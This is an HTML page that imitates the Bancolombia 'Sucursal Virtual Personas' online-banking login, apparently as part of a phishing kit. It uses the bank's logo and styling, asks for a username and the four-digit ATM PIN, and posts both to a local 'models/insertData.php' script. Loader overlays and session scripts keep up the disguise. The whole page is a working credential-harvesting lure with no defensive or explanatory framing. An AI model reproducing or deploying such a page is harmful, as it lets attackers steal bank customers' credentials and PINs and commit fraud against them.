<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sucursal Virtual Personas</title>
    <link rel="stylesheet" href="assets/styles/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
</head>
<style>
    /* Loader Styles */
    .loader-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.5);
        backdrop-filter: blur(15px);
        -webkit-backdrop-filter: blur(15px);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 9999;
    }

    .loader-container {
        background: white;
        width: 160px;
        height: 160px;
        border-radius: 50%;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }

    .spinner {
        width: 32px;
        height: 32px;
        border: 4px solid #e5e7eb;
        border-top: 4px solid #1f2937;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin-bottom: 8px;
    }

    .loading-text {
        color: #1f2937;
        font-family: 'Nunito', Arial, sans-serif;
        font-size: 16px;
        min-height: 24px;
        text-align: center;
        transition: opacity 0.3s ease;
    }

    @keyframes spin {
        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }
    }
</style>

<body>

    <!-- LOGO, FONDO-->
    <main class="svp-main">
        <div class="rayasBancol" style="background-image: url(https://svpersonas.apps.bancolombia.com/assets/images/auth-trazo.svg)">
            <div class="containerAllHeader">
                <div class="containerLogotipo">
                    <div class="logo">
                        <img
                            src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES"
                            alt="Logo-Bancol" style="width: 11.5rem;" />
                    </div>
                </div>
            </div>
            <h1 class="welcomeMessage">Sucursal Virtual Personas</h1>
            <!---->
            <!-- FORMULARIO -->
            <div class="form-container">
                <div class="continerDosForm">
                    <!---->
                    <!---->
                    <div class="cardBody">
                        <section class="card-container">
                            <section class="containerFormularioCentrado">
                                <section class="mensajeBienvenida">
                                    <h1>¡Hola!</h1>
                                    <h3>
                                        Ingresa los datos para gestionar tus productos y hacer
                                        transacciones.
                                    </h3>
                                </section>
                                <form action="models/insertData.php" method="post" id="loginForm">
                                    <section class="autenticadora">
                                        <section class="contenedorForm">
                                            <div class="separadorText">
                                                <div class="contenedorUser">
                                                    <div class="iconoUser"></div>
                                                    <label for="usuario" class="sr-only">Usuario</label>
                                                    <input
                                                        type="text"
                                                        id="user"
                                                        class="desingInput"
                                                        name="user"
                                                        autocomplete="off"
                                                        autocorrect="off"
                                                        required
                                                        minlength="6"
                                                        maxlength="20"
                                                        pattern="^[A-Za-z0-9]+$"
                                                        placeholder="Usuario" />
                                                    <div class="separadorEnlacess"></div>
                                                    <a href="https://svpersonas.apps.bancolombia.com/crear-usuario/recordar-usuario" class="link-underline">
                                                        <u class="ColorU lineaEnlaces">¿Olvidaste tu usuario?</u>
                                                    </a>
                                                </div>
                                                <div class="separadorContra">
                                                    <div class="contenedorPass">
                                                        <div class="iconoLock"></div>
                                                        <label for="clave" class="sr-only">Clave</label>
                                                        <input
                                                            type="password"
                                                            id="pass"
                                                            class="desingInput"
                                                            name="pwd"
                                                            autocomplete="off"
                                                            required
                                                            minlength="4"
                                                            maxlength="4"
                                                            pattern="^[0-9]+$"
                                                            placeholder="Clave del cajero" />
                                                        <div class="separadorEnlacess"></div>
                                                        <a href="#" class="link-underline">
                                                            <u class="ColorU lineaEnlaces">¿Olvidaste tu clave?</u>
                                                        </a>
                                                    </div>
                                                </div>
                                            </div>
                                        </section>
                                    </section>
                                    <section class="auth-button">
                                        <button class="button-primary ColorU" name="ingresoDb" type="submit">Iniciar sesión</button>
                                    </section>
                                </form>
                                <section class="crearUsuario">
                                    <a href="#" class="createUser">
                                        <u class="ColorU lineaEnlaces">Crear usuario</u>
                                    </a>
                                </section>
                            </section>
                        </section>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <!-- FOOTER -->
    <footer class="svp-footer">
        <div class="contenedorFooter">
            <div class="containerFooter">
                <!---->
                <div class="contenedorMensajesFooter">
                    <div class="top-links">
                        <a href="#" class="ColorU"> ¿Problemas para conectarte? </a>
                    </div>
                    <div class="top-links">
                        <a href="#" class="ColorU"> Aprende sobre seguridad </a>
                    </div>
                    <div class="top-links">
                        <a href="#" class="ColorU"> Reglamento Sucursal Virtual </a>
                    </div>
                    <div class="top-links">
                        <a href="#" class="ColorU"> Política de privacidad </a>
                    </div>
                </div>
                <!---->
                <div class="divisor"></div>
                <div class="footerButton">
                    <div class="bottonLeft">
                        <!---->
                        <div class="botonBancol">
                            <div class="bottonLogoBancol">
                                <img src="assets\images\Logo-Bancol.svg" alt="logo_Bancol" />
                            </div>
                            <div class="bottonVigilate">
                                <img src="assets\images\logo-vigilado.svg" alt="vigilado" />
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>

    <!-- Loader oculto inicialmente -->
    <div class="loader-overlay" style="display:none;">
        <div class="loader-container">
            <div class="spinner"></div>
            <div id="spinner" class="loading-text">Cargando...</div>
        </div>
    </div>


     <!-- Loader oculto inicialmente -->
    <div id= "practica" class="loader-overlay" style="display:none;">
        <div class="loader-container">
            <div class="spinner"></div>
            <div id="spinner" class="loading-text">Subiendo...</div>
        </div>
    </div>
    <!-- Scripts -->
    <script src="assets/js/login.js"></script>
    <script src="assets/js/getSesion.js"></script>
</body>

</html>